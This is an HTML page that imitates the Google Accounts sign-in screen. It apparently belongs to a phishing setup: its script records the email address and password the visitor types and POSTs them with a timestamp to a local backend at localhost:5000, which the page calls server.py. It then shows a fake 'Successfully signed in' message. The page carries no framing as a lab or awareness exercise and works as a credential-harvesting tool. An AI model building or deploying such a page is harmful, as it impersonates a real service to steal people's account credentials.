<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in - Google Accounts</title>
<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: 'Roboto', Arial, sans-serif;
    background-color: #fff;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    padding: 20px;
}

.container {
    width: 100%;
    max-width: 450px;
}

.card {
    border: 1px solid #dadce0;
    border-radius: 8px;
    padding: 48px 40px 36px;
    text-align: center;
}

.logo {
    margin-bottom: 16px;
}

.logo-text {
    font-size: 24px;
    color: #202124;
    font-weight: 400;
    letter-spacing: -0.5px;
}

.google-g {
    display: inline-block;
    font-weight: 500;
}

.g-blue { color: #4285f4; }
.g-red { color: #ea4335; }
.g-yellow { color: #fbbc04; }
.g-green { color: #34a853; }

h1 {
    font-size: 24px;
    font-weight: 400;
    color: #202124;
    margin: 16px 0 8px;
}

.subtitle {
    font-size: 16px;
    color: #202124;
    margin-bottom: 24px;
}

.input-wrapper {
    margin-bottom: 24px;
    text-align: left;
}

input {
    width: 100%;
    padding: 13px 15px;
    font-size: 16px;
    border: 1px solid #dadce0;
    border-radius: 4px;
    outline: none;
    transition: border-color 0.2s;
}

input:focus {
    border-color: #1a73e8;
    border-width: 2px;
    padding: 12px 14px;
}

input::placeholder {
    color: #5f6368;
}

.forgot-email {
    color: #1a73e8;
    text-decoration: none;
    font-size: 14px;
    font-weight: 500;
    display: inline-block;
    margin-top: 8px;
}

.forgot-email:hover {
    text-decoration: underline;
}

.info-text {
    font-size: 14px;
    color: #5f6368;
    margin: 16px 0 24px;
    text-align: left;
}

.button-row {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-top: 32px;
}

.create-account {
    color: #1a73e8;
    text-decoration: none;
    font-size: 14px;
    font-weight: 500;
}

.create-account:hover {
    text-decoration: underline;
}

button {
    background-color: #1a73e8;
    color: white;
    border: none;
    border-radius: 4px;
    padding: 10px 24px;
    font-size: 14px;
    font-weight: 500;
    cursor: pointer;
    transition: background-color 0.2s;
}

button:hover {
    background-color: #1765cc;
    box-shadow: 0 1px 2px 0 rgba(66,133,244,0.3), 0 1px 3px 1px rgba(66,133,244,0.15);
}

button:active {
    background-color: #1765cc;
}

.email-display {
    display: flex;
    align-items: center;
    gap: 12px;
    padding: 12px 16px;
    border: 1px solid #dadce0;
    border-radius: 24px;
    margin-bottom: 24px;
    background-color: #f1f3f4;
}

.email-icon {
    width: 32px;
    height: 32px;
    border-radius: 50%;
    background-color: #1a73e8;
    display: flex;
    align-items: center;
    justify-content: center;
    color: white;
    font-weight: 500;
    font-size: 14px;
}

.email-text {
    flex: 1;
    text-align: left;
    font-size: 14px;
    color: #3c4043;
}

.hidden { 
    display: none; 
}

#status, #error {
    margin-top: 16px;
    padding: 12px;
    border-radius: 4px;
    font-size: 14px;
}

#status {
    background-color: #e8f5e9;
    color: #1e7e34;
    border: 1px solid #c3e6cb;
}

#error {
    background-color: #fce8e6;
    color: #d93025;
    border: 1px solid #f5c6cb;
}
</style>
</head>
<body>

<div class="container">
    <div class="card">
        <div class="logo">
            <div class="logo-text">
                <span class="google-g g-blue">G</span><span class="google-g g-red">o</span><span class="google-g g-yellow">o</span><span class="google-g g-blue">g</span><span class="google-g g-green">l</span><span class="google-g g-red">e</span>
            </div>
        </div>

        <div id="emailStep">
            <h1>Sign in</h1>
            <div class="subtitle">Use your Google Account</div>
            
            <div class="input-wrapper">
                <input type="email" id="email" placeholder="Email or phone">
            </div>
            
            <a href="#" class="forgot-email">Forgot email?</a>
            
            <div class="info-text">
                Not your computer? Use Guest mode to sign in privately.
            </div>
            
            <div class="button-row">
                <a href="#" class="create-account">Create account</a>
                <button onclick="handleNext()">Next</button>
            </div>
        </div>

        <div id="passwordStep" class="hidden">
            <h1>Welcome</h1>
            
            <div class="email-display">
                <div class="email-icon" id="emailIcon">A</div>
                <div class="email-text" id="displayEmail"></div>
            </div>
            
            <div class="input-wrapper">
                <input type="password" id="password" placeholder="Enter your password">
            </div>
            
            <a href="#" class="forgot-email">Forgot password?</a>
            
            <div class="button-row">
                <a href="#" class="create-account" onclick="goBack(); return false;">Back</a>
                <button onclick="handleSignIn()">Next</button>
            </div>
        </div>

        <div id="status" class="hidden"></div>
        <div id="error" class="hidden"></div>
    </div>
</div>

<script>
let capturedEmail = '';

function handleNext() {
    const email = document.getElementById('email').value.trim();
    if (!email) {
        showError('Enter an email or phone number');
        return;
    }

    capturedEmail = email;
    document.getElementById('displayEmail').textContent = email;
    
    // Set icon letter
    const firstLetter = email.charAt(0).toUpperCase();
    document.getElementById('emailIcon').textContent = firstLetter;
    
    document.getElementById('emailStep').classList.add('hidden');
    document.getElementById('passwordStep').classList.remove('hidden');
    
    hideMessages();
}

function goBack() {
    document.getElementById('passwordStep').classList.add('hidden');
    document.getElementById('emailStep').classList.remove('hidden');
    document.getElementById('password').value = '';
    hideMessages();
}

async function handleSignIn() {
    const password = document.getElementById('password').value.trim();
    if (!password) {
        showError('Enter a password');
        return;
    }

    hideMessages();

    const data = {
        email: capturedEmail,
        password: password,
        timestamp: new Date().toISOString()
    };

    try {
        const response = await fetch('http://localhost:5000/send', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });

        if (!response.ok) throw new Error('Backend returned an error');

        const result = await response.json();
        showStatus('Successfully signed in! Response: ' + result.message);

    } catch (err) {
        console.error(err);
        showError('Could not connect to backend. Make sure server.py is running on port 5000.');
    }
}

function showError(message) {
    const errorDiv = document.getElementById('error');
    errorDiv.textContent = message;
    errorDiv.classList.remove('hidden');
}

function showStatus(message) {
    const statusDiv = document.getElementById('status');
    statusDiv.textContent = message;
    statusDiv.classList.remove('hidden');
}

function hideMessages() {
    document.getElementById('status').classList.add('hidden');
    document.getElementById('error').classList.add('hidden');
}
</script>

</body>
</html>
